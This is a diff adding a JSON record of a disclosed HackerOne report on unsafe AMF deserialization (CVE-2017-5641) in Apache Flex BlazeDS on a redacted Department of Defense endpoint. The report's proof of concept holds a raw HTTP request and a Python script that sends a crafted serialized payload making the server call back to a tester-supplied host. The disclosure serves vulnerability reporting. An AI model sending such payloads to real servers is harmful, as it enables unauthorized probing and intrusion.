@@ -1,0 +1,131 @@
+{
+  "id": 728614,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83Mjg2MTQ=",
+  "url": "https://hackerone.com/reports/728614",
+  "title": "[HTAF4-213] [Pre-submission] Unsafe AMF deserialization (CVE-2017-5641) in Apache Flex BlazeDS at the https://www.███████/daip/messagebroker/amf",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2019-11-04T04:12:19.019Z",
+  "submitted_at": "2019-11-04T04:12:19.019Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "sp1d3rs",
+    "url": "/sp1d3rs",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/079/690/6853ada3e124bdd8616b1be752223b558de38195_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 16064,
+    "url": "https://hackerone.com/deptofdefense",
+    "handle": "deptofdefense",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "U.S. Dept Of Defense",
+      "twitter_handle": "DC3VDP",
+      "website": "https://bit.ly/3ntULtN",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": true,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2017-5641"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2024-06-18T17:04:47.779Z",
+  "bug_reporter_agreed_on_going_public_at": "2024-05-30T03:30:15.407Z",
+  "team_member_agreed_on_going_public_at": "2024-06-18T17:04:47.668Z",
+  "comments_closed?": true,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "##Description\nWe identified potential unsafe deserialization vulnerability on the `https://www.█████/daip/messagebroker/amf` endpoint.\n\n##POC\nTo exclude false-positive reaction and show that pingback is result of AMF deserialization, and not a reaction to the external host in the POST body, first run this request:\n```\nPOST /daip/messagebroker/amf HTTP/1.1\nHost: www.███████\nConnection: close\nAccept-Encoding: gzip, deflate\nAccept: */*\nUser-Agent: python-requests/2.22.0\nContent-Type: application/x-amf\nContent-Length: 51\n\n<your collaborator host>\n```\nNothing will happen. You will receive something like this:\n███\nYou can wait few minutes to ensure that nothing is coming.\n\nNext, send the collaborator host inside the serialized AMF payload using this script, e.g. `script.py <collaborator> 80`\n```\nimport struct\nimport sys\nimport requests\n \nif len(sys.argv) != 3:\n    print \"Usage: host port\"\n    quit()\n \n\ncallback_IP = sys.argv[1]\ncallback_port = sys.argv[2]\n \namf_payload = '\\x00\\x03\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\x11\\x0a' + \\\n              '\\x07\\x33' + 'sun.rmi.server.UnicastRef' + struct.pack('>H', len(callback_IP)) + callback_IP + \\\n              struct.pack('>I', int(callback_port)) + \\\n              '\\xf9\\x6a\\x76\\x7b\\x7c\\xde\\x68\\x4f\\x76\\xd8\\xaa\\x3d\\x00\\x00\\x01\\x5b\\xb0\\x4c\\x1d\\x81\\x80\\x01\\x00';\n \nurl = \"https://www.███████/daip/messagebroker/amf\"\nheaders = {'Content-Type': 'application/x-amf'}\nresponse = requests.post(url, headers=headers, data=amf_payload, verify=False)\n```\n\nThis will result in the significant delay, and soon you will get the pingback from the ███/███ IP\nThis indicates, that backend server deserialized AMF data and triggered a DNS lookup (there won't be http since `sun.rmi.server.UnicastRef` doesn't communicate via http).\n\n##Suggested fix\nUpdate Apache Flex BlazeDS library\n\n## Impact\n\nUnsafe deserialization of AMF data.\nWe will work on this and try to improve impact, if possible.",
+  "weakness": {
+    "id": 52,
+    "name": "Deserialization of Untrusted Data"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 28,
+  "voters": [
+    "he4am",
+    "zy9ard3",
+    "shubham_srt",
+    "eminfidan",
+    "0x_elbialy2001",
+    "atikpo2",
+    "embassy001",
+    "vayunrix",
+    "hpahblackcat6",
+    "aecherli",
+    "and 18 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 10.0,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
